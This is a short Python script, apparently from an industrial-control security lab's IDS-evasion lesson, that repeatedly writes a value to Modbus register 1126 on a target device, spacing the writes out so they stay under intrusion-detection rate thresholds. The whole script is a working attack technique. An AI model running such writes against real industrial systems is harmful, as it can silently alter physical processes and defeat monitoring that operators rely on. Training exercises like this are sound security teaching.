#!/usr/bin/env python3
"""Low-and-slow Modbus writes for the IDS-evasion lesson: a few writes spaced
out so they stay under the IDS rate thresholds.

Usage: slow_write.py [ip] [count] [delay_seconds]
"""
import sys, time
from pymodbus.client import ModbusTcpClient

ip = sys.argv[1] if len(sys.argv) > 1 else "172.18.0.3"
count = int(sys.argv[2]) if len(sys.argv) > 2 else 5
delay = float(sys.argv[3]) if len(sys.argv) > 3 else 2.5
REG = 1126

c = ModbusTcpClient(ip, port=502)
c.connect()
print(f"Low-and-slow: {count} writes to register {REG} on {ip}, one every {delay:g}s")
for i in range(count):
    c.write_register(REG, 10)
    print(f"  write {i + 1}/{count}   (well under the IDS burst threshold)")
    time.sleep(delay)
c.close()
print("Done - no burst, no flood.")
